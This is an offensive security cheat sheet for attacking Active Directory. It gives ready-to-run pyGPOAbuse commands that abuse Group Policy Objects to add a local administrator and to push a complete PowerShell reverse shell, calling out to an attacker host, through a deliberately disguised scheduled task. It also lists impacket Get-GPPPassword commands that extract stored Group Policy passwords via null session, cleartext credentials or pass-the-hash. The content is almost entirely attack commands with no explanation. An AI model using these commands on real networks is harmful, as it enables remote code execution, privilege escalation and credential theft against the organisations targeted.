# Group Policy Objects

## Abuse GPO with pyGPOAbuse
Add john user to local administrators group
```
pygpoabuse <DOMAIN>/'<user>' -hashes <lm:nt> -gpo-id "<gpo_id>"
```

## Abuse GPO with pyGPOAbuse get reverse shell
Abuse GPO with pyGPOAbuse to get reverse shell
```
pygpoabuse <DOMAIN>/'<user>' -hashes <lm:nt> -gpo-id "<gpo_id>" -powershell -command "\$client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" -taskname "Completely Legit Task" -description "Dis is legit, pliz no delete" -user
```


# Get-GPPPassword

## Get-GPPPassword - with a NULL session
```
impacket-Get-GPPPassword -no-pass '<DC>'
```
# Get-GPPPassword - with cleartext credentials
```
impacket-Get-GPPPassword '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<DC>'
```
# Get-GPPPassword - pass-the-hash
```
impacket-Get-GPPPassword -hashes '<HASH>' '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<DC>'
```